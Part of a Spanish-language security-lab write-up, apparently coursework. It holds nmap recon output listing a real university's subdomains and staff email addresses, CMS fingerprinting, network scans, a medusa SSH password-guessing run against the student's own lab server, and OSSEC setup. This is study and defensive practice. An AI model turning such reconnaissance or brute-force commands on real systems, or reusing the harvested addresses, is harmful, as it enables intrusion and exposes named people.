+|     sbc-1.udc.es\nwww.sbc-1.udc.es
+|     lia2.tic.udc.es\nlia2.udc.es
+|     ftp.gadu.udc.es\nwww.ftp.gadu.udc.es
+|     autodiscover.udc.es\nwebmail2.udc.es
+|     mx2.udc.es\nwww.mx2.udc.es
+|     ocingest.udc.es\nwww.ocingest.udc.es
+|     ocengage.udc.es\nwww.ocengage.udc.es
+|     ocadmin.udc.es\nwww.ocadmin.udc.es
+|     live.udc.es\nwww.live.udc.es
+|     destv.udc.es\nwww.destv.udc.es
+|     authtv.udc.es\nwww.authtv.udc.es
+|     sai.udc.es\nwww.sai.udc.es
+|     servicash.udc.es\nwww.servicash.udc.es
+|     cerbero.tic.udc.es\nwww.cerbero.tic.udc.es
+|     data.sai.udc.es\nwww.data.sai.udc.es
+|     cas-saml.udc.es\nwww.cas-saml.udc.es
+|     economico.udc.es\nwww.economico.udc.es
+|     *.xrede.udc.es\nxrede.udc.es
+|     tic.udc.es\nwww.tic.udc.es
+|     svn.tic.udc.es\nwww.svn.tic.udc.es
+|     *.correo.udc.es\ncorreo.udc.es
+|     uxxiec.udc.es\nwww.uxxiec.udc.es
+|     uxxiecdev.udc.es\nwww.uxxiecdev.udc.es
+|     www.xestor.ade.udc.es\nxestor.ade.udc.es
+|     neosai.udc.es\nwww.neosai.udc.es
+|     www.xescampuswebvm.udc.es\nxescampuswebvm.udc.es
+|     matriculawebvm.udc.es\nwww.matriculawebvm.udc.es
+|     impresion.eps.udc.es\nwww.impresion.eps.udc.es
+|     udcportal.udc.es\nwww.udcportal.udc.es
+|     documenta.udc.es\nwww.documenta.udc.es
+|     radius.fic.udc.es\nwww.radius.fic.udc.es
+|     redmine.tic.udc.es\nwww.redmine.tic.udc.es
+|     nac.udc.es\nwww.nac.udc.es
+|     *.xescampus.udc.es\nxescampus.udc.es
+|     remoto.udc.es\nvpn2.udc.es
+|     iacobusplus.udc.es\nwww.iacobusplus.udc.es
+|     ANIETO@UDC.ES
+|     ELOY.DOMINGUEZ@UDC.ES
+|     EVA.MARIA.SOUTOG@UDC.ES
+|     videla@udc.es
+|     ESTEFANIA.MOURELLE@UDC.ES
+|     estefania.mourelle@udc.es
+|     VBARRIENTOS@UDC.ES
+|     JOSE.ANGEL.JURADO@UDC.ES
+|     VICTOR.BARRIENTOS@UDC.ES
+|     coro.ffeal@udc.es
+|     CORO.FFEAL@UDC.ES
+|     ELENA.GSOTO@UDC.ES
+|     victor.carneiro@udc.es
+|     EGS@UDC.ES
+|     SANTIAGO.IGLESIASB@UDC.ES
+|     MANUEL.MARTINEZ.CARBALLO@UDC.ES
+|     diego.giraldo@udc.es
+|     LUISA.SEGADE@UDC.ES
+|     MANUEL.PERALBO@UDC.ES
+|     RAQUEL.DSEIJAS@UDC.ES
+|     ICOLOMINAS@UDC.ES
+|     NURIA.FACHAL@UDC.ES
+|     JAVIER.DOMINGUEZ@UDC.ES
+|     JOSE.CARDONA@UDC.ES
+|     GUILLERMO.ALONSO.CARRO@UDC.ES
+|     S.MARTINEZ@UDC.ES
+|     ALMUDENA@UDC.ES
+|     ANXELA.BUGALLO@UDC.ES
+|     MARCOS.VIZCAINO@UDC.ES
+|     servizos.udc.es
+|     academica.udc.es\nautomatricula.udc.es
+|     wiki.fic.udc.es
+|     webmail.udc.es
+|     cas.udc.es
+|     admin.fic.udc.es
+|     fv.udc.es
+|     matricula.udc.es
+|     webmail.ucv.udc.es
+|     FIDEL.CACHEDA@UDC.ES
+|     nas.talionis.udc.es\nwww.nas.talionis.udc.es
+|     lia2.tic.udc.es\nwww.lia2.tic.udc.es
+|     umi.udc.es
+|     lia2.tic.udc.es
+|     radon.citic.udc.es
+|     iacobusplus.udc.es
+|     ojo.citic.udc.es\ntreboada.citic.udc.es
+|     vdi.udc.es
+|     cicanet.udc.es
+|     ceri2014.udc.es\nlpnmr2013.udc.es
+|     nauticaemaquinas.udc.es
+|     mail.udc.es\nsmtp.udc.es\nwebmail.udc.es\nzimbra.udc.es
+|     coruxo.dc.fi.udc.es
+|     campus.tic.udc.es
+|     autodiscovery.udc.es\nwebmail2.udc.es
+|     treboada.citic.udc.es
+|     webmail2.udc.es
+|     rnasa-imedir.udc.es\nwww.rnsa-imedir.udc.es
+|     data.sai.udc.es
+|     novas.udc.es\nwww.udc.es
+|     servicash.udc.es
+|     xestor.ade.udc.es
+|     cas-saml.udc.es
+|     economico.udc.es
+|     svn.tic.udc.es
+|     uxxiec.udc.es
+|     uxxiecdev.udc.es
+|     neosai.udc.es
+|     xescampuswebvm.udc.es
+|     matriculawebvm.udc.es
+|     smtp.udc.es
+|     sistemas.sic.udc.es
+|     probasinefgalicia.udc.es
+|     ocengage.udc.es
+|     cursosrcc.regicc.udc.es\nwww.cursosrcc.regicc.udc.es
+|     authtv.udc.es
+|     live.udc.es
+|     redmine.tic.udc.es
+|     eps.udc.es
+|     mail.udc.es\nsmtp.udc.es\nwebmail.udc.es
+|     www.udc.es
+|     tv.udc.es
+|     *.accedys.udc.es
+|     moodle19.udc.es
+|     incidencias.fic.udc.es
+|     cliente.documenta.udc.es
+|     alfresco-dev.udc.es
+|     silk.sai.udc.es
+|     svn.udc.es
+|     cixug.xescampus.udc.es
+|     portaleco.udc.es
+|     xescampus.udc.es
+|     furna.udc.es
+|     federico.udc.es
+|     aplicacions.sic.udc.es
+|     wiki.udc.es
+|     assets.udc.es
+|     svn.fic.udc.es
+|     xop.udc.es
+|     rede.udc.es
+|     espazos.udc.es
+|     *.vdi.udc.es
+|     cartografia.udc.es
+|     SEDE@UDC.ES
+|     xestor.fic.udc.es
+|     lportaleco.udc.es
+|     www.sai.udc.es
+|     cultura.udc.es
+|     eleccions.udc.es
+|     tenda.udc.es
+|     sxe.udc.es
+|     guiadocente.udc.es
+|     deportes.udc.es
+|     moodle.udc.es
+|     persoal.udc.es
+|     www.fundacion.udc.es
+|     bdi2.udc.es
+|     xestor.etsa.udc.es
+|     gnosis.udc.es
+|_    www.tic.udc.es
+
+Nmap done: 1 IP address (1 host up) scanned in 21.70 seconds
+```
+
+- ¿Qué gestor de contenidos se utiliza en www.usc.es?
+
+```bash
+root@debian:/home/lsi# apt install whatweb
+...
+root@debian:/home/lsi# whatweb udc.es
+http://udc.es [302 Found] Country[SPAIN][ES], IP[193.144.53.84], RedirectLocation[https://www.udc.es/]
+https://www.udc.es/ [200 OK] Country[SPAIN][ES], Email[info@udc.gal], HTML5, HTTPServer[OpenCms/10.5.4], IP[193.144.53.84], JQuery, Modernizr[2.8.3.min], OpenCms[10.5.4], Script[text/javascript], Strict-Transport-Security[max-age=31536000; includeSubDomains; preload], Title[Universidade da Coruña], X-UA-Compatible[IE=edge]
+```
+
+OpenCMS\[10.5.4]
+
+### Apartado P
+
+Trate de sacar un perfil de los principales sistemas que conviven en su red de prácticas, puertos accesibles, fingerprinting, etc.
+
+```bash
+root@debian:/home/lsi# nmap -A 10.11.48.1
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-01 17:08 CET
+Nmap scan report for 10.11.48.1
+Host is up (0.0020s latency).
+All 1000 scanned ports on 10.11.48.1 are filtered
+MAC Address: DC:08:56:10:84:B9 (Alcatel-Lucent Enterprise)
+Too many fingerprints match this host to give specific OS details
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.99 ms 10.11.48.1
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 29.60 seconds
+```
+
+Output de hacer el scan a toda la red:
+
+```bash
+root@debian:/home/lsi# nmap -A 10.11.48.0/23 > nmap_full.txt
+```
+
+### Apartado Q
+
+Realice algún ataque de “password guessing” contra su servidor ssh y compruebe que el analizador de logs reporta las correspondientes alarmas.
+
+Diccionario [aquí](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials).
+
+```bash
+root@debian:/home/lsi# medusa -h 10.11.48.50 -u lsi -P 10k-most-common.txt -M ssh
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+ACCOUNT CHECK: [ssh] Host: 10.11.48.50 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: password (1 of 10001 complete)
+ACCOUNT CHECK: [ssh] Host: 10.11.48.50 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 123456 (2 of 10001 complete)
+ACCOUNT CHECK: [ssh] Host: 10.11.48.50 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 12345678 (3 of 10001 complete)
+ACCOUNT CHECK: [ssh] Host: 10.11.48.50 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 1234 (4 of 10001 complete)
+ACCOUNT CHECK: [ssh] Host: 10.11.48.50 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: XXXXXXXXX (5 of 10001 complete)
+ACCOUNT FOUND: [ssh] Host: 10.11.48.50 User: lsi Password: XXXXXXXXX [SUCCESS]
+```
+
+> Al diccionario le añadí la password real del usuario lsi manualmente en la quinta posición.
+
+### Apartado R
+
+Reportar alarmas está muy bien, pero no estaría mejor un sistema activo, en lugar de uno pasivo. Configure algún sistema activo, por ejemplo OSSEC, y pruebe su funcionamiento ante un “password guessing”.
+
+Instalar [OSSEC](https://www.ossec.net/docs/docs/manual/installation/installation-requirements.html)
+
+Unban:
+
+```bash
+/var/ossec/active-response/bin/host-deny.sh delete - <ip>
+/var/ossec/active-response/bin/firewall-drop.sh delete - <ip>
+```
+
+Check logs:
+
+```bash
+tail /var/ossec/logs/ossec.log
+tail /var/ossec/logs/active-responses.log
+```
+
+### Apartado S
+
+Supongamos que una máquina ha sido comprometida y disponemos de un fichero con sus mensajes de log. Procese dicho fichero con OSSEC para tratar de localizar evidencias de lo acontecido (“post mortem”). Muestre las alertas detectadas con su grado de criticidad, así como un resumen de las mismas.
+
+[ossec-logtest](https://www.ossec.net/docs/docs/programs/ossec-logtest.html#example-2-using-ossec-for-the-forensic-analysis-of-log-files)
+
+```bash
 
 ```
